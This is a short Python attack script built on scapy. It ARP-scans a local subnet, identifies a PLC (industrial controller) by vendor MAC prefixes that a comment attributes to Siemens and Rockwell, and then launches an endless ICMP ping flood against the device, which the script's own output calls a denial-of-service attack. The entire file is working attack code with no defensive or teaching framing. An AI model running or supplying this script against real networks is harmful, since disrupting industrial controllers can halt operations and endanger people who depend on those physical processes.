import scapy.all as scapy
import socket
import os
import time

# Function to discover the PLC's IP on the network
def get_plc_ip(network_range):
    print("[*] Scanning network to detect PLC...")
    arp_request = scapy.ARP(pdst=network_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    for answer in answered_list:
        ip = answer[1].psrc
        mac = answer[1].hwsrc
        print(f"Discovered Device: IP={ip}, MAC={mac}")

        # Assuming PLC vendor-specific MAC prefix
        known_mac_prefixes = ["00:80:63", "00:0E:C6"]  # Example MACs for Siemens, Rockwell
        if any(mac.startswith(prefix) for prefix in known_mac_prefixes):
            print(f"[+] PLC identified at {ip}")
            return ip

    print("[!] No PLC detected!")
    return None

# Function to launch ICMP Ping Flood (Denial of Service)
def dos_attack(target_ip):
    print(f"[*] Initiating DoS attack on {target_ip}...")
    
    try:
        while True:
            scapy.send(scapy.IP(dst=target_ip)/scapy.ICMP(), verbose=False)
            time.sleep(0.05)  # Adjust rate to vary intensity
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")

# Main execution
if __name__ == "__main__":
    network_range = "192.168.1.0/24"  # Change to match your environment

    plc_ip = get_plc_ip(network_range)
    if plc_ip:
        dos_attack(plc_ip)
    else:
        print("[!] Exiting since no PLC was found.")